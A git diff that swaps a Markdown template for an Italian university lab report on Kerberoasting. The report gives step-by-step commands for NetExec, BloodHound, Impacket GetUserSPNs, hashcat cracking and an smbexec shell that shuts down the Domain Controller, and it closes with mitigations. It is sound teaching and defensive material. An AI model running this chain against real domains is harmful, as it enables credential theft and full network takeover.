@@ -1,709 +1,188 @@
-# Report Cybersecurity: Kerberoasting
+# Steal or Forge Kerberos Tickets: Kerberoasting
 ## Giovanni Bernobic - Cybersecurity - A.a. 2025/2026
-
-![Photo of Mountain](images/mountain.jpg)
-
-[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
-
 ## Introduzione
 
-**Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
+Active Directory (AD) è il servizio di directory che gestisce identità, autenticazione e autorizzazioni nella stragrande maggioranza delle reti aziendali Windows. La sua centralità lo rende anche il bersaglio principale di un attaccante interno: compromettere il Domain Controller (DC) equivale al controllo totale dell'organizzazione.
 
-![Figure 1: The Markdown Mark](images/markdown-red.png)
+Questo report documenta una catena d'attacco completa contro un dominio AD allestito in laboratorio. Lo scenario parte da un foothold realistico, credenziali di un utente di dominio non privilegiato, plausibilmente ottenute tramite phishing e mostra come un attaccante possa, usando esclusivamente strumenti pubblici e funzionalità legittime del protocollo, mappare la struttura del dominio con BloodHound CE, identificare un account di servizio Kerberoastable, craccare offline il suo Ticket Granting Service (TGS) e aprire una shell remota sul Domain Controller.
 
-Some of the key benefits are:
+Nessuna vulnerabilità zero-day è stata sfruttata: la compromissione nasce dalla composizione di un meccanismo di protocollo (Kerberos concede TGS a qualunque utente autenticato), una misconfigurazione di configurazione (account di servizio con SPN e privilegi eccessivi) e una password debole.
 
-1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
-2. Less chance of errors when writing in markdown.
-3. Produces valid XHTML output.
-4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
-5. Write in any text editor or Markdown application you like.
-6. Markdown is a joy to use!
+## 2. Threat Model
 
-John Gruber[^1], the author of Markdown, puts it like this:
+**Punto di partenza**: credenziali in chiaro dell'utente di dominio `giovanni` (password `Password1!`) e connettività di rete verso il DC. Questo modella l'esito positivo di una campagna di phishing/spear-phishing.
 
-> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
-> -- <cite>John Gruber</cite>
+**Obiettivo**: ottenere esecuzione di codice privilegiata sul Domain Controller `DC01.units.local`.
+
+**Vincoli:** nessun accesso fisico; nessun privilegio amministrativo iniziale; nessun exploit di codice — tutto avviene rimanendo nei normali protocolli di dominio (SMB, LDAP, Kerberos).
+
+**Mapping MITRE ATT\&CK:** Valid Accounts (T1078) → Discovery via LDAP → Kerberoasting (T1558.003) → Remote Code Execution via SMB.
+
+## 3. Setup dell'ambiente
+
+Il laboratorio è realizzato su **Oracle VirtualBox** con due macchine virtuali su una rete *Host-Only* isolata (`192.168.56.0/24`):
+
+- **DC01** — Windows Server 2022 (versione di valutazione), Domain Controller del dominio `units.local`, IP `192.168.56.10` (2 CPU, 4 GB RAM). Svolge anche il ruolo di server DNS — condizione strutturale per AD: senza i record SRV pubblicati dal DNS (`_kerberos._tcp.units.local`, `_ldap._tcp.dc._msdcs.units.local`), client e servizi non possono localizzare il DC.
+- **KALI** — Kali Linux rolling, macchina dell'attaccante, IP `192.168.56.20` (4 CPU, 6 GB RAM — più potenza per il cracking offline).
+
+Sul DC sono stati creati: l'utente `giovanni` (utente non privilegiato, password debole), e l'account di servizio `svc_sql` a cui è associato uno SPN (`MSSQL/DC01.units.local:1433`) e la password `P4ssw0rd2!`. `svc_sql` è membro del gruppo **Domain Admins** — misconfigurazione deliberata che in ambienti reali si riscontra quando gli amministratori assegnano privilegi eccessivi per comodità.
+
+### 3.1 Setup Windows Server 2022
+Particolare attenzione alla configurazione dell'ambiente Windows e alla creazione degli utenti e gruppi al suo interno.
 
 
-Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:
+## 4. Verifica del foothold e sincronizzazione temporale
 
-### Headings
+Prima di procedere, l'attaccante verifica la validità delle credenziali usando **NetExec**:
 
-Headings from `h1` through `h6` are constructed with a `#` for each level:
-
-```markdown
-# h1 Heading
-## h2 Heading
-### h3 Heading
-#### h4 Heading
-##### h5 Heading
-###### h6 Heading
+```bash
+nxc smb 192.168.56.10 -u giovanni -p 'Password1!'
 ```
 
-Renders to:
+L'output conferma l'autenticazione riuscita e restituisce il nome NetBIOS del dominio e la versione del sistema operativo. Le credenziali non consentono accessi amministrativi, ma sono sufficienti per interrogare LDAP e richiedere ticket Kerberos.
 
-<h1> h1 Heading </h1>
-<h2>  h2 Heading </h2>
-<h3>  h3 Heading </h3>
-<h4>  h4 Heading </h4>
-<h5>  h5 Heading </h5>
-<h6>  h6 Heading </h6>
+Un passaggio tecnico critico è la sincronizzazione dell'orologio di Kali con quello del DC: Kerberos rifiuta i ticket se lo skew temporale tra client e KDC supera 5 minuti (errore `KRB_AP_ERR_SKEW`). L'ora del DC viene letta tramite nmap e impostata sulla macchina attaccante:
 
-HTML:
+```bash
+DCTIME=$(nmap -sV -p 88 192.168.56.10 2>/dev/null | grep "server time" | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')
+sudo date -u -s "$DCTIME"
 
-```html
-<h1>h1 Heading</h1>
-<h2>h2 Heading</h2>
-<h3>h3 Heading</h3>
-<h4>h4 Heading</h4>
-<h5>h5 Heading</h5>
-<h6>h6 Heading</h6>
+
+## 5. Enumerazione del dominio con BloodHound CE
+
+**BloodHound CE** è uno strumento di graph-analysis per AD: il collector **bloodhound-python** interroga LDAP con le credenziali dell'utente di basso livello e scarica tutte le relazioni del dominio (utenti, gruppi, computer, GPO, ACL) in un archivio ZIP di file JSON. BloodHound li ingerisce in un database a grafo e visualizza i *percorsi d'attacco* come archi colorati.
+
+```bash
+bloodhound-python -u giovanni -p 'Password1!' -d units.local \
+  -ns 192.168.56.10 -c All --zip
 ```
 
-### Comments
+Il flag `-c All` raccoglie tutti i metodi disponibili (GroupMembers, LocalAdmin, RDP, DCOM, LoggedOn, ObjectProps, ACL). Il flag `--zip` comprime i JSON in un unico archivio importabile.
 
-Comments should be HTML compatible
+BloodHound CE viene avviato in Docker:
 
-```html
-<!--
-This is a comment
--->
-```
-Comment below should **NOT** be seen:
-
-<!--
-This is a comment
--->
-
-### Horizontal Rules
-
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
-
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
-
-renders to:
-
-___
-
----
-
-***
-
-
-### Body Copy
-
-Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.
-
-So this body copy:
-
-```markdown
-Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
-```
-renders to this HTML:
-
-```html
-<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
+```bash
+sudo ./bloodhound-cli start
 ```
 
-### Emphasis
+Dopo l'upload dello ZIP all'interfaccia su `http://localhost:8080`, si eseguono le query pre-built. Due risultano decisive:
 
-#### Bold
-For emphasizing a snippet of text with a heavier font-weight.
+**Query Cypher per account Kerberoastable:**
 
-The following snippet of text is **rendered as bold text**.
-
-```markdown
-**rendered as bold text**
-```
-renders to:
-
-**rendered as bold text**
-
-and this HTML
-
-```html
-<strong>rendered as bold text</strong>
+```cypher
+MATCH (u:User)
+WHERE u.hasspn = true AND u.enabled = true
+AND NOT u.objectid ENDS WITH "-502"
+AND NOT COALESCE(u.gsma, false) = true
+AND NOT COALESCE(u.msa, false) = true
+RETURN u LIMIT 100
 ```
 
-#### Italics
-For emphasizing a snippet of text with italics.
+Questa query restituisce `svc_sql`: un utente abilitato con SPN registrato, non è né il KDC (objectid `-502`) né un Group Managed Service Account — candidato perfetto per Kerberoasting.
 
-The following snippet of text is _rendered as italicized text_.
+La query **"Shortest Paths to Domain Admins"** rivela poi che `svc_sql` è membro diretto di `Domain Admins`: la sua compromissione garantisce immediatamente privilegi massimi.
 
-```markdown
-_rendered as italicized text_
+
+
+## 6. Kerberoasting: estrazione e cracking del TGS
+
+Il **Kerberoasting** sfrutta una caratteristica intrinseca del protocollo Kerberos: qualunque utente di dominio autenticato può richiedere al KDC un TGS per qualsiasi SPN registrato nel dominio. Il TGS è cifrato con l'hash NTLM (RC4) o la chiave AES della password dell'account associato a quell'SPN. L'hash può essere estratto e attaccato *offline*, senza generare ulteriore traffico verso il DC e senza rischiare lockout dell'account.
+
+### 6.1 Richiesta del TGS con Impacket
+
+**Impacket** è una raccolta di classi Python per l'interazione con i protocolli di rete Microsoft (SMB, NTLM, Kerberos). Lo strumento `GetUserSPNs`:
+
+1. Si autentica come `giovanni` e ottiene un TGT dal KDC.
+2. Interroga LDAP per enumerare tutti gli account con `servicePrincipalName` non vuoto.
+3. Per ciascuno, presenta il TGT e richiede il corrispondente TGS.
+4. Salva gli hash nel file di output.
+
+```bash
+impacket-GetUserSPNs units.local/giovanni:'Password1!' \
+  -dc-ip 192.168.56.10 -request -outputfile hashes.txt
 ```
 
-renders to:
+Il file `hashes.txt` contiene l'hash nel formato Hashcat. Il prefisso identifica l'algoritmo:
 
-_rendered as italicized text_
+```
+$krb5tgs$23$  →  RC4-HMAC  →  hashcat mode 13100
+$krb5tgs$18$  →  AES256    →  hashcat mode 19700
+```
 
-and this HTML:
+Il tipo si verifica con:
 
-```html
-<em>rendered as italicized text</em>
+```bash
+head -1 hashes.txt
 ```
 
 
-#### strikethrough
-In GFM (GitHub flavored Markdown) you can do strikethroughs.
 
-```markdown
-~~Strike through this text.~~
-```
-Which renders to:
+### 6.2 Cracking offline con Hashcat
 
-~~Strike through this text.~~
+Il cracking offline è il cuore teorico dell'attacco: a differenza degli attacchi online, che sono rallentati da policy di lockout e rilevamento, qui l'attaccante può tentare miliardi di candidate password al secondo senza che il DC sia coinvolto.
 
-HTML:
-
-```html
-<del>Strike through this text.</del>
+```bash
+hashcat -m 13100 -a 0 hashes.txt ./lista-pwd.txt \
+  -r /usr/share/hashcat/rules/best66.rule --force
 ```
 
-### Blockquotes
-For quoting blocks of content from another source within your document.
+`-m 13100` specifica il formato RC4 Kerberos TGS. `-a 0` è l'attacco a dizionario. Il flag `-r` applica le regole `best66`: 66 trasformazioni per parola (cambio case, sostituzione leetspeak, aggiunta di suffissi numerici) che aumentano drasticamente la copertura senza esplodere il keyspace come il brute force puro.
 
-Add `>` before any text you want to quote.
+Per visualizzare la password trovata senza rieseguire il cracking:
 
-```markdown
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
+```bash
+hashcat -m 13100 hashes.txt --show
 ```
 
-Renders to:
+La password di `svc_sql` viene recuperata: `P4ssw0rd2!`.
 
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
 
-and this HTML:
 
-```html
-<blockquote>
-  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
-</blockquote>
+
+## 7. Post-exploitation: shell remota sul Domain Controller
+
+Con le credenziali di `svc_sql` in chiaro, l'attaccante apre una shell remota sul DC tramite **impacket-smbexec**:
+
+```bash
+impacket-smbexec units.local/svc_sql:'P4ssw0rd2!'@192.168.56.10
 ```
 
-Blockquotes can also be nested:
+`smbexec` si connette al DC via SMB, crea un servizio Windows temporaneo che lancia `cmd.exe`, invia i comandi attraverso named pipe e rimuove il servizio dopo ogni risposta — tutto senza scrivere file persistenti sul disco. La shell risultante opera nel contesto di `svc_sql`, membro di Domain Admins.
 
-```markdown
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
+Dalla shell, l'accesso privilegiato viene dimostrato eseguendo:
+
+```bash
+shutdown /s /t 0
 ```
 
-Renders to:
+Il Domain Controller si spegne: il dominio è compromesso.
 
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
 
-### Lists
 
-#### Unordered
-A list of items in which the order of the items does not explicitly matter.
+## 8. Conclusioni e mitigazioni
 
-You may use any of the following symbols to denote bullets for each list item:
+L'attacco non ha richiesto exploit di codice né vulnerabilità zero-day. La compromissione è la composizione di tre elementi: (1) il protocollo Kerberos, by design, concede TGS a qualunque utente autenticato; (2) un account utente con SPN registrato — condizione sufficiente per il Kerberoasting; (3) una password debole, craccabile offline. BloodHound ha reso visibile, in un unico grafo, ciò che in un'analisi manuale richiederebbe decine di query LDAP separate.
 
-```markdown
-* valid bullet
-- valid bullet
-+ valid bullet
-```
+**Mitigazioni in un ambiente di produzione:**
 
-For example
+- **Group Managed Service Accounts (gMSA):** gli SPN dovrebbero risiedere su gMSA, non su account utente. I gMSA hanno password di 240 caratteri casuali, ruotate automaticamente da AD e mai note agli operatori.
+- **AES-only:** deprecare RC4-HMAC e forzare la cifratura AES aumenta esponenzialmente il costo computazionale del cracking offline.
+- **Principio del minimo privilegio:** un account di servizio SQL non deve essere Domain Admin. Il tiering amministrativo (workstation / server / DC) limita il blast radius delle compromissioni laterali.
+- **Monitoring dell'evento 4769:** ogni richiesta di TGS genera l'evento Windows Security 4769. Un utente che richiede TGS per molti SPN in rapida successione è un segnale Kerberoasting rilevabile con anomaly detection.
 
-```markdown
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-```
-Renders to:
+La stessa visualizzazione che BloodHound offre all'attaccante è oggi un alleato dei Blue Team: usarla periodicamente per identificare e correggere i percorsi prima che vengano sfruttati è la difesa più efficace.
 
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
 
-And this HTML
 
-```html
-<ul>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit
-    <ul>
-      <li>Phasellus iaculis neque</li>
-      <li>Purus sodales ultricies</li>
-      <li>Vestibulum laoreet porttitor sem</li>
-      <li>Ac tristique libero volutpat at</li>
-    </ul>
-  </li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ul>
-```
+## Fonti
 
-#### Ordered
-
-A list of items in which the order of items does explicitly matter.
-
-```markdown
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-```
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-And this HTML:
-
-```html
-<ol>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit</li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ol>
-```
-
-**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:
-
-```markdown
-1. Lorem ipsum dolor sit amet
-1. Consectetur adipiscing elit
-1. Integer molestie lorem at massa
-1. Facilisis in pretium nisl aliquet
-1. Nulla volutpat aliquam velit
-1. Faucibus porta lacus fringilla vel
-1. Aenean sit amet erat nunc
-1. Eget porttitor lorem
-```
-
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-### Code
-
-#### Inline code
-Wrap inline snippets of code with `` ` ``.
-
-```markdown
-In this example, `<section></section>` should be wrapped as **code**.
-```
-
-Renders to:
-
-In this example, `<section></section>` should be wrapped with **code**.
-
-HTML:
-
-```html
-<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
-```
-
-#### Indented code
-
-Or indent several lines of code by at least four spaces, as in:
-
-<pre>
-  // Some comments
-  line 1 of code
-  line 2 of code
-  line 3 of code
-</pre>
-
-Renders to:
-
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-
-HTML:
-
-```html
-<pre>
-  <code>
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-  </code>
-</pre>
-```
-
-
-#### Block code "fences"
-
-Use "fences"  ```` ``` ```` to block in multiple lines of code.
-
-<pre>
-``` markup
-Sample text here...
-```
-</pre>
-
-
-```
-Sample text here...
-```
-
-HTML:
-
-```html
-<pre>
-  <code>Sample text here...</code>
-</pre>
-```
-
-#### Syntax highlighting
-
-GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:
-
-<pre>
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-</pre>
-
-Renders to:
-
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-
-### Tables
-Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.
-
-
-```markdown
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-Renders to:
-
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-And this HTML:
-
-```html
-<table>
-  <tr>
-    <th>Option</th>
-    <th>Description</th>
-  </tr>
-  <tr>
-    <td>data</td>
-    <td>path to data files to supply the data that will be passed into templates.</td>
-  </tr>
-  <tr>
-    <td>engine</td>
-    <td>engine to be used for processing templates. Handlebars is the default.</td>
-  </tr>
-  <tr>
-    <td>ext</td>
-    <td>extension to be used for dest files.</td>
-  </tr>
-</table>
-```
-
-### Right aligned text
-
-Adding a colon on the right side of the dashes below any heading will right align text for that column.
-
-```markdown
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-### Links
-
-#### Basic link
-
-```markdown
-[Assemble](http://assemble.io)
-```
-
-Renders to (hover over the link, there is no tooltip):
-
-[Assemble](http://assemble.io)
-
-HTML:
-
-```html
-<a href="http://assemble.io">Assemble</a>
-```
-
-
-#### Add a title
-
-```markdown
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-```
-
-Renders to (hover over the link, there should be a tooltip):
-
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-
-HTML:
-
-```html
-<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
-```
-
-#### Named Anchors
-
-Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:
-
-```markdown
-# Table of Contents
-  * [Chapter 1](#chapter-1)
-  * [Chapter 2](#chapter-2)
-  * [Chapter 3](#chapter-3)
-```
-will jump to these sections:
-
-```markdown
-### Chapter 1 <a id="chapter-1"></a>
-Content for chapter one.
-
-### Chapter 2 <a id="chapter-2"></a>
-Content for chapter one.
-
-### Chapter 3 <a id="chapter-3"></a>
-Content for chapter one.
-```
-**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.
-
-### Images
-Images have a similar syntax to links but include a preceding exclamation point.
-
-```markdown
-![Image of Minion](https://octodex.github.com/images/minion.png)
-```
-![Image of Minion](https://octodex.github.com/images/minion.png)
-
-and using a local image (which also displays in GitHub):
-
-```markdown
-![Image of Octocat](images/octocat.jpg)
-```
-![Image of Octocat](images/octocat.jpg)
-
-## Topic One  
-
-Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.
-
-## Topic Two
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-## Topic Three
-
-### Overview
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-### Subtopic One
-
-Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
-rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
-vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
-lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
-limenque per ferre graves causa neque credi epulasque isque celebravit pisces.
-
-- Iasone filum nam rogat
-- Effugere modo esse
-- Comminus ecce nec manibus verba Persephonen taxo
-- Viribus Mater
-- Bello coeperunt viribus ultima fodiebant volentem spectat
-- Pallae tempora
-
-#### Fuit tela Caesareos tamen per balatum
-
-De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
-puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
-tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
-hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
-te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
-sceleris inquit operatus, abundet **excipit has**.
-
-In locumque *perque* infelix hospite parente adducto aequora Ismarios,
-feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
-similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
-genero, virtus rite.
-
-- Citius chlamydis saepe colorem paludosa territaque amoris
-- Hippolytus interdum
-- Ego uterque tibi canis
-- Tamen arbore trepidosque
-
-#### Colit potiora ungues plumeus de glomerari num
-
-Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
-**est aevi** esse riget agmenque nutrit fugacis.
-
-- Coortis vox Pylius namque herbosas tuae excedere
-- Tellus terribilem saetae Echinadas arbore digna
-- Erraverit lectusque teste fecerat
-
-Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
-caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.
-
-### Subtopic Two
-
-Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
-spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
-cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
-[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
-contingat militis concitus, ad!
-
-#### Et omnis blanda fetum ortum levatus altoque
-
-Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
-absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
-aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
-et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
-metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
-sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
-*hectora candidus*!
-
-#### Et hanc
-
-Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
-nitidique! Ignavo tibi in perdam, est tu precantia fuerat
-[revelli](http://jaspervdj.be/).
-
-Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
-super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
-plus *cum ignes nondum*, fata sum arcus lustraverat tantis!
-
-#### Adulterium tamen instantiaque puniceum et formae patitur
-
-Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
-triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
-cacumine dei malum solus.
-
-1. Mansit post ambrosiae terras
-2. Est habet formidatis grandior promissa femur nympharum
-3. Maestae flumina
-4. Sit more Trinacris vitasset tergo domoque
-5. Anxia tota tria
-6. Est quo faece nostri in fretum gurgite
-
-Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
-habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
-loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
-ignescere eburno e decolor terga.
-
-> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
-
-[^1]: [Markdown - John Gruber](https://daringfireball.net/projects/markdown/)
+- SpecterOps, *BloodHound Community Edition — Quickstart*, [https://bloodhound.specterops.io/](https://bloodhound.specterops.io/)
+- Impacket, repository ufficiale, [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
+- Impacket - Cheatsheet, [https://www.blackhillsinfosec.com/impacket-cheatsheet/](https://www.blackhillsinfosec.com/impacket-cheatsheet/)
+- Hashcat, *Example Hashes e modalità di attacco*, [https://hashcat.net/wiki/](https://hashcat.net/wiki/)
+- Microsoft Learn, *Active Directory Domain Services Overview, Identity and access*, [https://learn.microsoft.com/it-it/windows-server/identity/identity-and-access](https://learn.microsoft.com/it-it/windows-server/identity/identity-and-access)
+- HackTricks, *Kerberoast*, [https://hacktricks.wiki/windows-hardening/active-directory-methodology/kerberoast.html](https://hacktricks.wiki/windows-hardening/active-directory-methodology/kerberoast.html)
+- MITRE ATT&CK, T1558.003 *Steal or Forge Kerberos Tickets: Kerberoasting*, [https://attack.mitre.org/techniques/T1558/003/](https://attack.mitre.org/techniques/T1558/003/)
+- Slide del corso: *620 — Authentication: NTLM/Kerberos*, *600 — Access Control: Organizations*, *650 — Techniques: Advanced*
+- Kerberoasting Attack Simulation in Active Directory, [https://medium.com/@aradityaraj.07/kerberoasting-attack-simulation-in-active-directory-9b39fad6dacb](https://medium.com/@aradityaraj.07/kerberoasting-attack-simulation-in-active-directory-9b39fad6dacb)
+- Guide To Active Directory Kerberosting With Kali Linux, [https://logos-red.com/blog/guide-to-active-directory-kerberosting-with-kali-linux/](https://logos-red.com/blog/guide-to-active-directory-kerberosting-with-kali-linux/)
